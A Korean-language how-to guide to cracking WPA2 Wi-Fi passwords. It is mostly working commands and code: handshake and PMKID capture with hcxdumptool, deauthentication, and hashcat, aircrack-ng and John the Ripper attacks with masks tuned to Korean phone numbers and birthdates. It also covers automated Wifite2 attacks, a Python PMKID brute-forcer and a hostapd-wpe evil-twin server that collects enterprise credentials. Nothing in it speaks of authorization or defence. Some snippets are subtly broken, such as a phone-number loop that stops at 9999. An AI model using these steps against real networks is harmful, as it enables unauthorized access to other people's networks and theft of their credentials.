# WPA2 크래킹 완전 가이드

## WPA2 크랙 전략 개요

```
WPA2 크랙 방법론
─────────────────────────────────────────
1. 핸드셰이크 수집
   └── 패시브 대기 OR Deauth 강제

2. PMKID 공격 (핸드셰이크 불필요, 2018)
   └── AP에서 직접 수집 가능

3. 오프라인 크래킹
   ├── 딕셔너리 공격 (wordlist)
   ├── 규칙 기반 (hashcat rules)
   ├── 마스크 공격 (패턴 기반)
   └── 레인보우 테이블 (pmkid-cache)

4. 성공 시 비밀번호 확인
─────────────────────────────────────────
```

---

## 1. Hashcat을 이용한 WPA2 크래킹

### 핸드셰이크 파일 변환

```bash
# aircrack-ng 캡처 파일 → hashcat 형식
# hcxdumptool/hcxtools 사용 (권장)
sudo apt install hcxdumptool hcxtools

# hcxdumptool으로 직접 캡처 (모든 AP)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --enable_status=3

# 특정 AP만 타겟
echo "AABBCCDDEEFF" > target.txt  # 타겟 BSSID (콜론 없이)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --filterlist_ap=target.txt \
    --filtermode=2

# pcapng → hashcat 형식 변환
hcxpcapngtool capture.pcapng -o capture.hc22000

# 기존 .cap 파일 변환
hcxpcapngtool capture.cap -o capture.hc22000

# 내용 확인
hcxhashtool -i capture.hc22000 --info=short
```

### Hashcat WPA2 크래킹

```bash
# 모드 22000 (WPA2 PMKID/핸드셰이크 통합)
# 모드 2500 (WPA2 핸드셰이크, 구버전)

# 딕셔너리 공격
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# 규칙 기반 공격 (효과적)
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# 마스크 공격 (한국 비밀번호 패턴)
# ?d=숫자, ?u=대문자, ?l=소문자, ?a=모든 문자
hashcat -m 22000 capture.hc22000 -a 3 "?d?d?d?d?d?d?d?d"    # 8자리 숫자
hashcat -m 22000 capture.hc22000 -a 3 "?l?l?l?l?d?d?d?d"    # 소문자4+숫자4
hashcat -m 22000 capture.hc22000 -a 3 "?u?l?l?l?d?d?d?d"    # 대소문자+숫자
hashcat -m 22000 capture.hc22000 -a 3 "010?d?d?d?d?d?d?d?d" # 010으로 시작 전화번호

# 조합 공격 (두 wordlist 결합)
hashcat -m 22000 capture.hc22000 -a 1 wordlist1.txt wordlist2.txt

# 하이브리드 (딕셔너리 + 마스크)
hashcat -m 22000 capture.hc22000 -a 6 wordlist.txt "?d?d?d?d"  # 단어+숫자4개

# GPU 사용 최적화
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -d 1 \              # GPU 장치 1 사용
    -w 4 \              # 워크로드 (1=저부하, 4=최대)
    --gpu-temp-abort=90  # 90°C 초과 시 중단

# 세션 저장/복원
hashcat -m 22000 capture.hc22000 wordlist.txt --session=my_session
hashcat -m 22000 --session=my_session --restore  # 이어서 진행

# 크랙된 비밀번호 확인
hashcat -m 22000 capture.hc22000 --show
```

### Aircrack-ng를 이용한 크래킹

```bash
# 딕셔너리 공격
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# 특정 BSSID
aircrack-ng capture-01.cap \
    -b AA:BB:CC:DD:EE:FF \
    -w wordlist.txt

# 실시간 확인 (진행 상황)
aircrack-ng capture-01.cap -w wordlist.txt -q
```

---

## 2. PMKID 공격 (2018)

```
기존: 클라이언트 핸드셰이크 필요 (시간 소요)
PMKID: AP에 연결 시도만으로 수집 가능

PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || Client_MAC)
→ PMK = PBKDF2(PSK, SSID)
→ 오프라인 딕셔너리 공격 가능
```

```bash
# PMKID 수집 (hcxdumptool)
sudo hcxdumptool \
    -i wlan0mon \
    -o pmkid.pcapng \
    --enable_status=3 \
    --filterlist_ap=target.txt

# 수집 즉시 확인
hcxhashtool -i pmkid.pcapng --pmkid | head

# hashcat 형식으로 변환
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000

# 크래킹
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

---

## 3. Wordlist 최적화

### 효과적인 워드리스트 구성

```bash
# 기본 워드리스트
/usr/share/wordlists/rockyou.txt          # 1400만개
/usr/share/wordlists/dirbuster/           # 웹 경로용

# 추가 워드리스트 다운로드
wget https://github.com/danielmiessler/SecLists/archive/master.zip
ls SecLists/Passwords/WiFi-WPA/

# 한국어 특화 워드리스트 생성
# 전화번호 패턴
python3 -c "
for i in range(0, 9999):
    print(f'010{i:08d}')
    print(f'011{i:08d}')
    print(f'016{i:08d}')
" > phone_numbers.txt

# 생년월일 패턴
python3 -c "
for year in range(1960, 2010):
    for month in range(1, 13):
        for day in range(1, 32):
            print(f'{year}{month:02d}{day:02d}')
" > birthdays.txt
```

### hashcat 규칙 파일 커스텀

```bash
# custom.rule - 한국 패턴에 최적화된 규칙
# 기본 단어 변형
:            # 원본 유지
l            # 전체 소문자
u            # 전체 대문자
c            # 첫 글자 대문자

# 숫자 추가
$1           # 끝에 1 추가
$123         # 끝에 123 추가
$1234        # 끝에 1234 추가
$!           # 끝에 ! 추가
$@           # 끝에 @ 추가

# 앞에 숫자 추가
^1           # 앞에 1 추가

# 년도 추가
$2024
$2023
$2022
$2021
$2020

# 교체
sa@          # a → @ 교체
se3          # e → 3 교체
si1          # i → 1 교체
so0          # o → 0 교체
```

```bash
# 규칙 적용
hashcat -m 22000 capture.hc22000 base_words.txt -r custom.rule

# 여러 규칙 동시 적용
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -r rule1.rule \
    -r rule2.rule
```

---

## 4. John the Ripper

```bash
# 핸드셰이크 변환 (aircrack 형식)
# john-jumbo에서 지원
john --list=formats | grep WPA

# WPA2 크래킹
wpaclean clean.cap capture-01.cap  # 핸드셰이크 추출
aircrack-ng clean.cap -J john_file  # john 형식으로 변환

john john_file.hccap --wordlist=wordlist.txt

# 증분 공격 (Incremental)
john john_file.hccap --incremental

# 마스크 공격
john john_file.hccap --mask="?d?d?d?d?d?d?d?d"
```

---

## 5. Wifite2 - 자동화 공격

```bash
# Wifite2 설치
sudo apt install wifite

# 전체 자동 공격
sudo wifite

# 특정 BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# 딕셔너리 지정
sudo wifite --dict /path/to/wordlist.txt

# WPS 공격만
sudo wifite --wps-only

# Deauth 비활성화 (조용한 모드)
sudo wifite --nodeauth

# 옵션
sudo wifite \
    --kill \            # 간섭 프로세스 종료
    --crack \           # 캡처 즉시 크래킹
    --dict rockyou.txt
```

---

## 6. 고급: PMKID 캐시 테이블

```python
#!/usr/bin/env python3
"""PMKID 사전 계산 테이블 생성"""

import hashlib
import hmac
import struct

def compute_pmk(password: str, ssid: str) -> bytes:
    """PMK = PBKDF2-SHA1(password, ssid, 4096, 32)"""
    return hashlib.pbkdf2_hmac(
        'sha1',
        password.encode('utf-8'),
        ssid.encode('utf-8'),
        4096,
        32
    )

def compute_pmkid(pmk: bytes, ap_mac: str, client_mac: str) -> str:
    """PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)"""
    
    # MAC 주소 바이트 변환
    ap_bytes = bytes.fromhex(ap_mac.replace(':', ''))
    client_bytes = bytes.fromhex(client_mac.replace(':', ''))
    
    data = b"PMK Name" + ap_bytes + client_bytes
    
    pmkid = hmac.new(pmk, data, hashlib.sha1).digest()
    return pmkid[:16].hex()

def generate_pmkid_table(ssid: str, wordlist_file: str, 
                          ap_mac: str, client_mac: str):
    """PMKID 사전 테이블 생성"""
    
    found = False
    
    with open(wordlist_file, 'r', encoding='latin-1') as f:
        for i, line in enumerate(f):
            password = line.strip()
            if not password:
                continue
            
            pmk = compute_pmk(password, ssid)
            pmkid = compute_pmkid(pmk, ap_mac, client_mac)
            
            if i % 1000 == 0:
                print(f"\r[*] 시도: {i:,}", end='', flush=True)
            
            # 수집된 PMKID와 비교
            if pmkid == TARGET_PMKID:
                print(f"\n[+] 비밀번호 발견: {password}")
                found = True
                break
    
    if not found:
        print(f"\n[-] 비밀번호를 찾지 못했습니다.")

TARGET_PMKID = "d6fd3e5xxxxxxxxxxxxxx"  # 수집된 PMKID

if __name__ == "__main__":
    generate_pmkid_table(
        ssid="TargetWiFi",
        wordlist_file="wordlist.txt",
        ap_mac="AA:BB:CC:DD:EE:FF",
        client_mac="11:22:33:44:55:66"
    )
```

---

## 7. 성능 벤치마크

```bash
# hashcat 성능 테스트
hashcat -b -m 22000

# 일반적인 성능 (GPU별)
# GTX 1080 Ti: ~500,000 H/s
# RTX 3090:    ~750,000 H/s
# RTX 4090:    ~1,100,000 H/s

# rockyou.txt (14M) 크래킹 예상 시간
# RTX 3090: ~19초 (딕셔너리)
# 8자리 숫자 전체: 100,000,000 / 750,000 = ~133초

# 클라우드 크래킹 (AWS)
# p3.2xlarge (V100): ~400,000 H/s
# 비용: 약 $3/시간

# 분산 크래킹 (Hashtopolis)
# 여러 GPU 서버 연동
# docker run hashtopolis/hashtopolis
```

---

## 8. WPA Enterprise (802.1X) 공격

```bash
# PEAP/MSCHAPv2 캡처 및 크래킹
# EAP 인증 패킷 수집
sudo airodump-ng wlan0mon --write enterprise_capture

# asleap으로 MSCHAPv2 크래킹
asleap -r enterprise_capture-01.cap \
       -W wordlist.txt

# hostapd-wpe (WPA Enterprise Evil Twin)
# 자격증명 수집용 가짜 RADIUS 서버
sudo apt install hostapd-wpe
# /etc/hostapd-wpe/hostapd-wpe.conf 설정 후:
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 캡처된 MSCHAPv2 챌린지/응답 크래킹
hashcat -m 5500 netntlm.txt wordlist.txt  # NTLMv1
hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2
```
